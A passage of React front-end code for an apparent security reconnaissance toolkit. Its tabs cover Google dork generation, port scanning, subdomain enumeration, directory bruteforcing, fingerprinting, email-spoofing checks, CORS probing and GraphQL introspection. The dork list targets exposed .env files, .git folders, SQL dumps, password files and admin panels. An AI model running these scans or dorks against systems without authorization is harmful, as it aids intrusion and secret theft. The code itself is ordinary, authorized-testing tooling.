  { cat: "Exposed files & backups", dorks: ["site:{D} ext:sql | ext:dbf | ext:mdb", "site:{D} ext:log", "site:{D} ext:bak | ext:old | ext:backup", "site:{D} intitle:\"index of\"", "site:{D} ext:env | ext:yml | ext:conf | ext:cnf | ext:ini"] },
  { cat: "Login & admin panels", dorks: ["site:{D} inurl:admin | inurl:login | inurl:signin", "site:{D} intitle:\"admin login\"", "site:{D} inurl:wp-admin | inurl:wp-login", "site:{D} inurl:portal | inurl:dashboard"] },
  { cat: "Sensitive documents", dorks: ["site:{D} ext:pdf confidential | internal", "site:{D} ext:xls | ext:xlsx | ext:csv", "site:{D} ext:doc | ext:docx", "site:{D} \"password\" ext:txt | ext:log"] },
  { cat: "Config & source leaks", dorks: ["site:{D} inurl:.git | inurl:.svn", "site:{D} inurl:phpinfo | intitle:phpinfo", "site:{D} intext:\"index of /\" \".env\"", "site:{D} inurl:config | inurl:setup"] },
  { cat: "Subdomains & tech", dorks: ["site:*.{D}", "site:{D} inurl:api | inurl:v1 | inurl:v2", "site:{D} inurl:swagger | inurl:openapi", "site:{D} inurl:.json | inurl:.xml"] },
  { cat: "Cameras & devices", dorks: ["site:{D} inurl:\"view/index.shtml\"", "site:{D} intitle:\"webcamXP\"", "site:{D} inurl:\"axis-cgi/mjpg\""] },
];
function DorkTab() {
  const [domain, setDomain] = useState("");
  const d = domain.trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "") || "example.com";
  const link = (q) => `https://www.google.com/search?q=${encodeURIComponent(q)}`;
  return (
    <div className="space-y-4" data-testid="dork-panel">
      <p className="text-xs text-zinc-500 font-mono">Generate Google dork queries scoped to a target domain — for authorized reconnaissance / attack-surface discovery.</p>
      <div className="bg-[#121212] border border-border p-5 flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={domain} onChange={(e) => setDomain(e.target.value)} data-testid="dork-input" placeholder="target domain (e.g. example.com)" />
        <span className="inline-flex items-center px-3 text-xs font-mono text-zinc-500 border border-border">scope: {d}</span>
      </div>
      <div className="space-y-4">
        {DORK_CATS.map((c) => (
          <div key={c.cat} className="bg-[#121212] border border-border" data-testid={`dork-${c.cat.split(' ')[0].toLowerCase()}`}>
            <div className="px-5 py-3 border-b border-border flex items-center gap-2"><ScanSearch className="w-4 h-4 text-primary" /><h3 className="font-heading text-sm font-semibold">{c.cat}</h3></div>
            <div className="p-4 space-y-2">
              {c.dorks.map((q, i) => { const full = q.replaceAll("{D}", d); return (
                <div key={i} className="flex items-center justify-between gap-3 border border-border bg-[#0a0a0a] px-3 py-2">
                  <code className="font-mono text-[11px] text-zinc-300 break-all">{full}</code>
                  <div className="flex items-center gap-2 shrink-0">
                    <a href={link(full)} target="_blank" rel="noreferrer" className="text-zinc-500 hover:text-primary" title="Search on Google"><ExternalLink className="w-3.5 h-3.5" /></a>
                    <button onClick={() => copy(full)} className="text-zinc-500 hover:text-primary"><Copy className="w-3.5 h-3.5" /></button>
                  </div>
                </div>
              ); })}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}


/* ==================== Fast Port Scanner (RustScan-style, 2-phase) ==================== */
const SCAN_PROFILES = [
  { v: "quick", label: "Quick (~35)" },
  { v: "top100", label: "Top 100" },
  { v: "top1000", label: "Top 1000" },
  { v: "full", label: "Full 65535" },
  { v: "custom", label: "Custom" },
];
const RISK_COLOR = { CRITICAL: "#EF4444", HIGH: "#F97316", MEDIUM: "#F59E0B", LOW: "#3B82F6" };
function PortScanTab() {
  const [host, setHost] = useState("");
  const [profile, setProfile] = useState("quick");
  const [ports, setPorts] = useState("1-1024");
  const [jobId, setJobId] = useState(null);
  const [job, setJob] = useState(null);
  const [busy, setBusy] = useState(false);

  useEffect(() => {
    if (!jobId) return;
    let alive = true;
    const poll = async () => {
      try {
        const { data } = await api.get(`/toolkit/portscan/status/${jobId}`);
        if (!alive) return;
        setJob(data);
        if (data.status === "running") setTimeout(poll, 700);
        else { setBusy(false); if (data.status === "done") toast.success(`${data.open_count} open · ${data.risk_count} risky`); }
      } catch { if (alive) { setBusy(false); toast.error("Lost scan"); } }
    };
    poll();
    return () => { alive = false; };
  }, [jobId]);

  const start = async (e) => {
    e.preventDefault(); if (!host.trim()) return toast.error("Enter a host or IP");
    setBusy(true); setJob(null); setJobId(null);
    try {
      const { data } = await api.post("/toolkit/portscan/start", { host: host.trim(), profile, ports });
      setJob({ ...data, status: "running", phase: "sweep", done: 0, open: [], ports: [] });
      setJobId(data.id);
    } catch (err) { setBusy(false); toast.error(formatApiError(err.response?.data?.detail) || "Scan failed"); }
  };
  const cancel = async () => { if (jobId) { try { await api.post(`/toolkit/portscan/cancel/${jobId}`); } catch {} } };

  const pct = job && job.total ? Math.round((job.done / job.total) * 100) : 0;
  const exportJson = () => { copyBlob(JSON.stringify(job, null, 2), `portscan_${job.host}.json`, "application/json"); };
  const exportCsv = () => {
    const rows = [["port", "service", "risk", "banner", "server", "title"]].concat(
      (job.ports || []).map((p) => [p.port, p.service, p.risk?.severity || "", (p.banner || "").replace(/,/g, " "), (p.server || "").replace(/,/g, " "), (p.title || "").replace(/,/g, " ")])
    );
    copyBlob(rows.map((r) => r.join(",")).join("\n"), `portscan_${job.host}.csv`, "text/csv");
  };

  return (
    <div className="space-y-4" data-testid="portscan-panel">
      <p className="text-xs text-zinc-500 font-mono">RustScan-style 2-phase scanner — fast connect sweep, then deep service/version + risk analysis on open ports. Authorized targets only. Private/LAN IPs are unreachable from the cloud engine.</p>
      <form onSubmit={start} className="space-y-2">
        <div className="flex flex-col sm:flex-row gap-2">
          <input className={inputCls} value={host} onChange={(e) => setHost(e.target.value)} data-testid="portscan-input" placeholder="scanme.nmap.org  or  93.184.216.34" />
          <select className={inputCls + " sm:w-44"} value={profile} onChange={(e) => setProfile(e.target.value)} data-testid="portscan-profile">
            {SCAN_PROFILES.map((p) => <option key={p.v} value={p.v}>{p.label}</option>)}
          </select>
          {busy ? (
            <button type="button" onClick={cancel} data-testid="portscan-cancel" className="border border-severity-high text-severity-high font-semibold px-4 py-2.5 inline-flex items-center gap-2 hover:bg-severity-high/10 transition-colors"><ShieldX className="w-4 h-4" /> Stop</button>
          ) : (
            <button className={btnCls} data-testid="portscan-run"><Radar className="w-4 h-4" /> Scan</button>
          )}
        </div>
        {profile === "custom" && (
          <input className={inputCls} value={ports} onChange={(e) => setPorts(e.target.value)} data-testid="portscan-ports" placeholder="ports e.g. 22,80,443,8000-8100" />
        )}
      </form>

      {job && (
        <div className="space-y-3" data-testid="portscan-result">
          {/* progress */}
          <div className="bg-[#121212] border border-border p-4 space-y-2">
            <div className="flex flex-wrap items-center gap-x-6 gap-y-1 font-mono text-xs">
              <span><span className="text-zinc-500">host </span><span className="text-white">{job.host}</span></span>
              <span><span className="text-zinc-500">ip </span><span className="text-primary">{job.ip}</span></span>
              <span><span className="text-zinc-500">open </span><span className="text-emerald-400">{job.open?.length || 0}</span></span>
              {job.risk_count > 0 && <span><span className="text-zinc-500">risky </span><span className="text-severity-high">{job.risk_count}</span></span>}
              <span className="ml-auto flex items-center gap-1.5">
                {job.status === "running" && <Loader2 className="w-3 h-3 animate-spin text-primary" />}
                <span className={job.status === "done" ? "text-emerald-400" : job.status === "cancelled" ? "text-severity-medium" : "text-primary"}>{job.status === "running" ? `${job.phase}…` : job.status}</span>
              </span>
            </div>
            <div className="h-1.5 bg-[#0a0a0a] border border-border overflow-hidden">
              <div className="h-full bg-primary transition-all" style={{ width: `${pct}%` }} data-testid="portscan-progress" />
            </div>
            <div className="flex justify-between font-mono text-[10px] text-zinc-600">
              <span>{job.done || 0} / {job.total} ports {job.elapsed_ms ? `· ${(job.elapsed_ms / 1000).toFixed(1)}s` : ""}</span>
              {job.status === "done" && job.ports?.length > 0 && (
                <span className="flex gap-3">
                  <button onClick={exportCsv} data-testid="portscan-csv" className="hover:text-primary">CSV</button>
                  <button onClick={exportJson} data-testid="portscan-json" className="hover:text-primary">JSON</button>
                  <button onClick={() => copy(JSON.stringify(job.ports))} className="hover:text-primary"><Copy className="w-3 h-3 inline" /></button>
                </span>
              )}
            </div>
          </div>

          {/* host intel */}
          {job.host_info && (job.host_info.org || job.host_info.rdns) && (
            <div className="bg-[#121212] border border-border p-3 flex flex-wrap gap-x-6 gap-y-1 font-mono text-[11px]" data-testid="portscan-hostinfo">
              {job.host_info.rdns && <span><span className="text-zinc-500">rDNS </span><span className="text-zinc-300">{job.host_info.rdns}</span></span>}
              {job.host_info.org && <span><span className="text-zinc-500">org </span><span className="text-zinc-300">{job.host_info.org}</span></span>}
              {job.host_info.country && <span><span className="text-zinc-500">geo </span><span className="text-zinc-300">{job.host_info.country}</span></span>}
              {job.host_info.asn && <span><span className="text-zinc-500">asn </span><span className="text-zinc-300">{job.host_info.asn}</span></span>}
            </div>
          )}

          {job.note && <p className="text-xs text-severity-medium font-mono border border-severity-medium/30 bg-severity-medium/5 px-3 py-2">{job.note}</p>}

          {/* results */}
          {job.status !== "running" && (job.ports?.length ? (
            <div className="bg-[#121212] border border-border divide-y divide-border">
              <div className="grid grid-cols-[70px_130px_1fr_90px] gap-3 px-4 py-2 data-label"><span>Port</span><span>Service</span><span>Banner / Title</span><span>Risk</span></div>
              {job.ports.map((p) => (
                <div key={p.port} className="grid grid-cols-[70px_130px_1fr_90px] gap-3 px-4 py-2.5 font-mono text-xs items-center" data-testid={`portscan-row-${p.port}`}>
                  <span className="text-emerald-400">{p.port}</span>
                  <span className="text-white">{p.service}</span>
                  <span className="text-zinc-500 break-all min-w-0">{p.title || p.banner || p.server || "—"}{p.server && (p.title || p.banner) ? <span className="text-zinc-600"> · {p.server}</span> : ""}</span>
                  {p.risk ? (
                    <span className="font-bold text-[10px] uppercase tracking-wide px-1.5 py-0.5 border self-center text-center" style={{ color: RISK_COLOR[p.risk.severity], borderColor: RISK_COLOR[p.risk.severity] + "66" }} title={p.risk.reason}>{p.risk.severity}</span>
                  ) : <span className="text-zinc-700 text-[10px]">—</span>}
                </div>
              ))}
            </div>
          ) : (
            <p className="text-sm text-zinc-500">No open ports found among the scanned set.</p>
          ))}

          {/* risk callouts */}
          {job.status === "done" && job.ports?.some((p) => p.risk) && (
            <div className="space-y-1.5" data-testid="portscan-risks">
              {job.ports.filter((p) => p.risk).map((p) => (
                <div key={p.port} className="flex items-start gap-2 text-xs border-l-2 pl-3 py-1" style={{ borderColor: RISK_COLOR[p.risk.severity] }}>
                  <ShieldAlert className="w-3.5 h-3.5 shrink-0 mt-0.5" style={{ color: RISK_COLOR[p.risk.severity] }} />
                  <span className="text-zinc-400"><b className="text-white">{p.port}/{p.service}</b> — {p.risk.reason}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}



/* ==================== Subdomain Enumerator ==================== */
function SubdomainTab() {
  const [domain, setDomain] = useState("");
  const [busy, setBusy] = useState(false);
  const [res, setRes] = useState(null);
  const run = async (e) => {
    e.preventDefault(); if (!domain.trim()) return toast.error("Enter a domain");
    setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/subdomain-enum", { domain: domain.trim() }); setRes(data); toast.success(`${data.found_count} subdomains found`); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Enum failed"); }
    finally { setBusy(false); }
  };
  return (
    <div className="space-y-4" data-testid="subdomain-panel">
      <p className="text-xs text-zinc-500 font-mono">Resolve a wordlist of ~140 common subdomains against the target via live DNS. Authorized recon only.</p>
      <form onSubmit={run} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={domain} onChange={(e) => setDomain(e.target.value)} data-testid="subdomain-input" placeholder="example.com" />
        <button className={btnCls} disabled={busy} data-testid="subdomain-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Waypoints className="w-4 h-4" />} Enumerate</button>
      </form>
      {res && (
        <div className="space-y-3" data-testid="subdomain-result">
          <div className="bg-[#121212] border border-border p-4 flex flex-wrap gap-x-6 gap-y-1 font-mono text-xs">
            <span><span className="text-zinc-500">domain </span><span className="text-primary">{res.domain}</span></span>
            <span><span className="text-zinc-500">found </span><span className="text-emerald-400">{res.found_count}</span>/{res.checked}</span>
            <span><span className="text-zinc-500">took </span><span className="text-zinc-300">{res.elapsed_ms} ms</span></span>
          </div>
          {res.found_count === 0 ? (
            <p className="text-sm text-zinc-500">No common subdomains resolved.</p>
          ) : (
            <div className="bg-[#121212] border border-border divide-y divide-border">
              {res.found.map((s) => (
                <div key={s.subdomain} className="flex items-center justify-between gap-3 px-4 py-2 font-mono text-xs" data-testid={`subdomain-row`}>
                  <span className="text-emerald-400 break-all">{s.subdomain}</span>
                  <span className="text-zinc-500 text-right break-all">{s.ips.join(", ")}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

/* ==================== HTTP Request Builder / Replay ==================== */
const HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"];
function RequestBuilderTab() {
  const [method, setMethod] = useState("GET");
  const [url, setUrl] = useState("");
  const [headers, setHeaders] = useState("");
  const [body, setBody] = useState("");
  const [busy, setBusy] = useState(false);
  const [res, setRes] = useState(null);
  const send = async (e) => {
    e.preventDefault(); if (!url.trim()) return toast.error("Enter a URL");
    setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/http-request", { method, url: url.trim(), headers, body }); setRes(data); toast.success(`${data.status} ${data.reason} · ${data.elapsed_ms}ms`); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Request failed"); }
    finally { setBusy(false); }
  };
  const statusColor = (s) => s < 300 ? "#22C55E" : s < 400 ? "#3B82F6" : s < 500 ? "#F59E0B" : "#EF4444";
  return (
    <div className="space-y-4" data-testid="reqbuilder-panel">
      <p className="text-xs text-zinc-500 font-mono">Craft and replay any HTTP request — pick a method, add headers/body, inspect the full response. Authorized targets only.</p>
      <form onSubmit={send} className="space-y-2">
        <div className="flex gap-2">
          <select className={inputCls + " sm:w-32"} value={method} onChange={(e) => setMethod(e.target.value)} data-testid="reqbuilder-method">
            {HTTP_METHODS.map((m) => <option key={m} value={m}>{m}</option>)}
          </select>
          <input className={inputCls} value={url} onChange={(e) => setUrl(e.target.value)} data-testid="reqbuilder-url" placeholder="https://api.example.com/v1/users" />
          <button className={btnCls} disabled={busy} data-testid="reqbuilder-send">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />} Send</button>
        </div>
        <div className="grid md:grid-cols-2 gap-2">
          <textarea className={areaCls} value={headers} onChange={(e) => setHeaders(e.target.value)} data-testid="reqbuilder-headers" placeholder={"Headers (one per line)\nAuthorization: Bearer xyz\nContent-Type: application/json"} />
          <textarea className={areaCls} value={body} onChange={(e) => setBody(e.target.value)} data-testid="reqbuilder-body" placeholder={'Request body (for POST/PUT)\n{"key":"value"}'} />
        </div>
      </form>
      {res && (
        <div className="space-y-3" data-testid="reqbuilder-result">
          <div className="bg-[#121212] border border-border p-4 flex flex-wrap items-center gap-x-6 gap-y-1 font-mono text-xs">
            <span className="font-bold text-sm" style={{ color: statusColor(res.status) }}>{res.status} {res.reason}</span>
            <span><span className="text-zinc-500">time </span><span className="text-zinc-300">{res.elapsed_ms} ms</span></span>
            <span><span className="text-zinc-500">size </span><span className="text-zinc-300">{res.size_bytes} B</span></span>
            <span className="break-all"><span className="text-zinc-500">type </span><span className="text-zinc-300">{res.content_type || "—"}</span></span>
            {res.redirects?.length > 0 && <span><span className="text-zinc-500">redirects </span><span className="text-primary">{res.redirects.join(" → ")}</span></span>}
          </div>
          <details className="bg-[#121212] border border-border p-4" data-testid="reqbuilder-resp-headers">
            <summary className="data-label cursor-pointer">Response headers ({Object.keys(res.headers).length})</summary>
            <div className="mt-3 space-y-1 font-mono text-[11px]">
              {Object.entries(res.headers).map(([k, v]) => (
                <div key={k} className="flex gap-2 border-b border-border/40 pb-1"><span className="text-primary shrink-0">{k}:</span><span className="text-zinc-400 break-all">{v}</span></div>
              ))}
            </div>
          </details>
          <div className="bg-[#0a0a0a] border border-border">
            <div className="flex items-center justify-between px-4 py-2 border-b border-border">
              <p className="data-label">Response body {res.truncated && <span className="text-severity-medium">(truncated)</span>}</p>
              <button onClick={() => copy(res.body)} className="text-zinc-500 hover:text-primary"><Copy className="w-3.5 h-3.5" /></button>
            </div>
            <pre className="p-4 text-[11px] font-mono text-zinc-300 whitespace-pre-wrap break-all max-h-96 overflow-auto" data-testid="reqbuilder-body-out">{res.body || "(empty)"}</pre>
          </div>
        </div>
      )}
    </div>
  );
}


/* ==================== Directory / File Bruteforcer ==================== */
function DirScanTab() {
  const [url, setUrl] = useState("");
  const [jobId, setJobId] = useState(null);
  const [job, setJob] = useState(null);
  const [busy, setBusy] = useState(false);
  useEffect(() => {
    if (!jobId) return;
    let alive = true;
    const poll = async () => {
      try {
        const { data } = await api.get(`/toolkit/dirscan/status/${jobId}`);
        if (!alive) return;
        setJob(data);
        if (data.status === "running") setTimeout(poll, 700);
        else { setBusy(false); if (data.status === "done") toast.success(`${data.found_count} paths found`); }
      } catch { if (alive) { setBusy(false); toast.error("Lost scan"); } }
    };
    poll();
    return () => { alive = false; };
  }, [jobId]);
  const start = async (e) => {
    e.preventDefault(); if (!url.trim()) return toast.error("Enter a URL");
    setBusy(true); setJob(null); setJobId(null);
    try { const { data } = await api.post("/toolkit/dirscan/start", { url: url.trim() }); setJob({ ...data, status: "running", done: 0, found: [] }); setJobId(data.id); }
    catch (err) { setBusy(false); toast.error(formatApiError(err.response?.data?.detail) || "Scan failed"); }
  };
  const cancel = async () => { if (jobId) { try { await api.post(`/toolkit/dirscan/cancel/${jobId}`); } catch {} } };
  const pct = job && job.total ? Math.round((job.done / job.total) * 100) : 0;
  return (
    <div className="space-y-4" data-testid="dirscan-panel">
      <p className="text-xs text-zinc-500 font-mono">Mini-gobuster — brute-forces ~160 common paths/files (/admin, /.git, /.env, /backup, /api…) on a web target. Authorized use only.</p>
      <form onSubmit={start} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={url} onChange={(e) => setUrl(e.target.value)} data-testid="dirscan-input" placeholder="https://example.com" />
        {busy ? <button type="button" onClick={cancel} data-testid="dirscan-cancel" className="border border-severity-high text-severity-high font-semibold px-4 py-2.5 inline-flex items-center gap-2 hover:bg-severity-high/10"><ShieldX className="w-4 h-4" /> Stop</button>
          : <button className={btnCls} data-testid="dirscan-run"><FolderSearch className="w-4 h-4" /> Bruteforce</button>}
      </form>
      {job && (
        <div className="space-y-3" data-testid="dirscan-result">
          <div className="bg-[#121212] border border-border p-4 space-y-2">
            <div className="flex justify-between font-mono text-xs"><span className="text-zinc-400 break-all">{job.base}</span><span className={job.status === "done" ? "text-emerald-400" : "text-primary"}>{job.status === "running" ? "scanning…" : job.status}</span></div>
            <div className="h-1.5 bg-[#0a0a0a] border border-border overflow-hidden"><div className="h-full bg-primary transition-all" style={{ width: `${pct}%` }} data-testid="dirscan-progress" /></div>
            <div className="font-mono text-[10px] text-zinc-600">{job.done || 0}/{job.total} · {job.found?.length || 0} found {job.elapsed_ms ? `· ${(job.elapsed_ms / 1000).toFixed(1)}s` : ""}</div>
          </div>
          {job.status !== "running" && (job.found?.length ? (
            <div className="bg-[#121212] border border-border divide-y divide-border">
              <div className="grid grid-cols-[1fr_70px_80px_90px] gap-3 px-4 py-2 data-label"><span>Path</span><span>Status</span><span>Size</span><span>Flag</span></div>
              {job.found.map((f) => (
                <a key={f.path} href={safeHttpUrl(job.base + f.path)} target="_blank" rel="noreferrer" className="grid grid-cols-[1fr_70px_80px_90px] gap-3 px-4 py-2 font-mono text-xs items-center hover:bg-[#1a1a1a]" data-testid="dirscan-row">
                  <span className="text-emerald-400 break-all">{f.path}</span>
                  <span className="text-zinc-300">{f.status}</span>
                  <span className="text-zinc-500">{f.size}B</span>
                  {f.severity ? <span className="font-bold text-[10px] uppercase px-1.5 py-0.5 border text-center" style={{ color: RISK_COLOR[f.severity], borderColor: RISK_COLOR[f.severity] + "66" }}>{f.severity}</span> : <span className="text-zinc-700">—</span>}
                </a>
              ))}
            </div>
          ) : <p className="text-sm text-zinc-500">No interesting paths found.</p>)}
        </div>
      )}
    </div>
  );
}

/* ==================== Web Tech & WAF Fingerprint ==================== */
function FingerprintTab() {
  const [url, setUrl] = useState(""); const [busy, setBusy] = useState(false); const [res, setRes] = useState(null);
  const run = async (e) => { e.preventDefault(); if (!url.trim()) return toast.error("Enter a URL"); setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/fingerprint", { url: url.trim() }); setRes(data); toast.success(`${data.tech.length} technologies detected`); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Failed"); } finally { setBusy(false); } };
  const CATS = { server: "Server", language: "Language", framework: "Framework", cms: "CMS", js: "JS / UI", analytics: "Analytics" };
  return (
    <div className="space-y-4" data-testid="fingerprint-panel">
      <p className="text-xs text-zinc-500 font-mono">Detect the target's server, CMS/framework, JS libraries and any WAF/CDN in front of it.</p>
      <form onSubmit={run} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={url} onChange={(e) => setUrl(e.target.value)} data-testid="fingerprint-input" placeholder="example.com" />
        <button className={btnCls} disabled={busy} data-testid="fingerprint-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Fingerprint className="w-4 h-4" />} Fingerprint</button>
      </form>
      {res && (
        <div className="space-y-3" data-testid="fingerprint-result">
          <div className="bg-[#121212] border border-border p-4 grid sm:grid-cols-3 gap-2 font-mono text-xs">
            <span><span className="text-zinc-500">server </span><span className="text-white">{res.server || "—"}</span></span>
            <span><span className="text-zinc-500">powered-by </span><span className="text-white">{res.powered_by || "—"}</span></span>
            <span><span className="text-zinc-500">generator </span><span className="text-white">{res.generator || "—"}</span></span>
          </div>
          {res.waf.length > 0 && (
            <div className="border border-severity-high/40 bg-severity-high/5 p-3" data-testid="fingerprint-waf">
              <p className="data-label text-severity-high mb-1">WAF / CDN detected</p>
              <div className="flex flex-wrap gap-2">{res.waf.map((w) => <span key={w} className="font-mono text-[11px] border border-severity-high/40 text-severity-high px-2 py-0.5">{w}</span>)}</div>
            </div>
          )}
          <div className="bg-[#121212] border border-border p-4">
            <p className="data-label mb-2">Technologies ({res.tech.length})</p>
            {res.tech.length === 0 ? <p className="text-zinc-600 text-xs">No signatures matched.</p> : (
              <div className="flex flex-wrap gap-2">
                {res.tech.map((t) => <span key={t.name} className="font-mono text-[11px] border border-primary/40 bg-primary/10 text-primary px-2 py-0.5" title={`${CATS[t.category] || t.category} · ${t.evidence}`}>{t.name}</span>)}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

/* ==================== Email / DNS Security Recon ==================== */
function EmailDnsTab() {
  const [domain, setDomain] = useState(""); const [busy, setBusy] = useState(false); const [res, setRes] = useState(null);
  const run = async (e) => { e.preventDefault(); if (!domain.trim()) return toast.error("Enter a domain"); setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/email-dns", { domain: domain.trim() }); setRes(data); toast[data.spoofable ? "error" : "success"](data.spoofable ? "Domain is spoofable!" : "Good email posture"); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Failed"); } finally { setBusy(false); } };
  const Row = ({ k, ok, v }) => (
    <div className="flex items-start justify-between gap-3 border-b border-border/50 py-2 font-mono text-xs">
      <span className="text-zinc-500 flex items-center gap-1.5">{ok ? <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" /> : <ShieldAlert className="w-3.5 h-3.5 text-severity-high" />} {k}</span>
      <span className="text-zinc-300 text-right break-all max-w-[70%]">{v}</span>
    </div>
  );
  return (
    <div className="space-y-4" data-testid="emaildns-panel">
      <p className="text-xs text-zinc-500 font-mono">Check a domain's email-spoofing posture — SPF, DKIM, DMARC, MX, CAA and DNSSEC records.</p>
      <form onSubmit={run} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={domain} onChange={(e) => setDomain(e.target.value)} data-testid="emaildns-input" placeholder="example.com" />
        <button className={btnCls} disabled={busy} data-testid="emaildns-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <AtSign className="w-4 h-4" />} Analyze</button>
      </form>
      {res && (
        <div className="space-y-3" data-testid="emaildns-result">
          <div className="border p-3 flex items-center gap-2" style={{ borderColor: res.spoofable ? "#EF444466" : "#22C55E66", background: res.spoofable ? "#EF444414" : "#22C55E14" }}>
            {res.spoofable ? <ShieldAlert className="w-5 h-5 text-severity-critical" /> : <ShieldCheck className="w-5 h-5 text-emerald-400" />}
            <p className="font-heading text-sm font-semibold" style={{ color: res.spoofable ? "#EF4444" : "#22C55E" }}>{res.spoofable ? "SPOOFABLE — weak email authentication" : "Protected against basic spoofing"}</p>
          </div>
          <div className="bg-[#121212] border border-border p-4">
            <Row k="SPF" ok={res.spf.length > 0} v={res.spf[0] || "missing"} />
            <Row k="DMARC" ok={res.dmarc.length > 0 && res.dmarc_policy !== "none"} v={res.dmarc_policy ? `p=${res.dmarc_policy}` : "missing"} />
            <Row k="DKIM" ok={Object.keys(res.dkim).length > 0} v={Object.keys(res.dkim).join(", ") || "no common selector"} />
            <Row k="MX" ok={res.mx.length > 0} v={res.mx.join(", ") || "none"} />
            <Row k="CAA" ok={res.caa.length > 0} v={res.caa.join(", ") || "none"} />
            <Row k="DNSSEC" ok={res.dnssec} v={res.dnssec ? "enabled" : "disabled"} />
          </div>
          {res.issues.length > 0 && (
            <div className="space-y-1.5" data-testid="emaildns-issues">
              {res.issues.map((i, x) => (
                <div key={x} className="flex items-start gap-2 text-xs border-l-2 pl-3 py-1" style={{ borderColor: RISK_COLOR[i.severity] }}>
                  <span className="font-bold" style={{ color: RISK_COLOR[i.severity] }}>{i.check}</span>
                  <span className="text-zinc-400">{i.detail}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

/* ==================== CORS Misconfiguration Tester ==================== */
function CorsTab() {
  const [url, setUrl] = useState(""); const [busy, setBusy] = useState(false); const [res, setRes] = useState(null);
  const run = async (e) => { e.preventDefault(); if (!url.trim()) return toast.error("Enter a URL"); setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/cors-test", { url: url.trim() }); setRes(data); toast[data.vulnerable ? "error" : "success"](data.vulnerable ? "CORS misconfig found!" : "No CORS misconfig"); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Failed"); } finally { setBusy(false); } };
  return (
    <div className="space-y-4" data-testid="cors-panel">
      <p className="text-xs text-zinc-500 font-mono">Probe a URL with malicious Origins to detect CORS misconfigurations (arbitrary-origin reflection, null origin, credentials).</p>
      <form onSubmit={run} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={url} onChange={(e) => setUrl(e.target.value)} data-testid="cors-input" placeholder="https://api.example.com/data" />
        <button className={btnCls} disabled={busy} data-testid="cors-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Globe2 className="w-4 h-4" />} Test CORS</button>
      </form>
      {res && (
        <div className="space-y-3" data-testid="cors-result">
          {res.findings.length > 0 ? res.findings.map((f, i) => (
            <div key={i} className="flex items-start gap-2 border-l-2 pl-3 py-2" style={{ borderColor: RISK_COLOR[f.severity] }}>
              <ShieldAlert className="w-4 h-4 shrink-0 mt-0.5" style={{ color: RISK_COLOR[f.severity] }} />
              <span className="text-xs"><b className="uppercase" style={{ color: RISK_COLOR[f.severity] }}>{f.severity}</b> <span className="text-zinc-300">{f.detail}</span></span>
            </div>
          )) : <p className="text-sm text-emerald-400 flex items-center gap-2"><ShieldCheck className="w-4 h-4" /> No CORS misconfiguration detected.</p>}
          <div className="bg-[#121212] border border-border divide-y divide-border" data-testid="cors-tests">
            <div className="grid grid-cols-[1fr_1fr_90px] gap-3 px-4 py-2 data-label"><span>Origin sent</span><span>ACAO returned</span><span>Creds</span></div>
            {res.tests.map((t, i) => (
              <div key={i} className="grid grid-cols-[1fr_1fr_90px] gap-3 px-4 py-2 font-mono text-[11px]">
                <span className="text-zinc-400 break-all">{t.origin}</span>
                <span className="text-zinc-300 break-all">{t.error ? "—" : (t.acao || "none")}</span>
                <span className={t.acac === "true" ? "text-severity-high" : "text-zinc-600"}>{t.acac || "—"}</span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

/* ==================== GraphQL Introspection Dumper ==================== */
function GraphqlTab() {
  const [url, setUrl] = useState(""); const [busy, setBusy] = useState(false); const [res, setRes] = useState(null);
  const run = async (e) => { e.preventDefault(); if (!url.trim()) return toast.error("Enter a GraphQL URL"); setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/graphql", { url: url.trim() }); setRes(data); toast[data.introspection_enabled ? "error" : "message"](data.introspection_enabled ? "Introspection ENABLED — schema exposed" : "Introspection disabled"); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Failed"); } finally { setBusy(false); } };
  return (
    <div className="space-y-4" data-testid="graphql-panel">
      <p className="text-xs text-zinc-500 font-mono">Check if a GraphQL endpoint leaks its schema via introspection (a common info-disclosure misconfig) and dump the type names.</p>
      <form onSubmit={run} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={url} onChange={(e) => setUrl(e.target.value)} data-testid="graphql-input" placeholder="https://example.com/graphql" />
        <button className={btnCls} disabled={busy} data-testid="graphql-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Braces className="w-4 h-4" />} Introspect</button>
      </form>
      {res && (
        <div className="space-y-3" data-testid="graphql-result">
          <div className="border p-3 flex items-center gap-2" style={{ borderColor: res.introspection_enabled ? "#F9731666" : "#22C55E66", background: res.introspection_enabled ? "#F9731614" : "#22C55E14" }}>
            {res.introspection_enabled ? <ShieldAlert className="w-5 h-5 text-severity-high" /> : <ShieldCheck className="w-5 h-5 text-emerald-400" />}
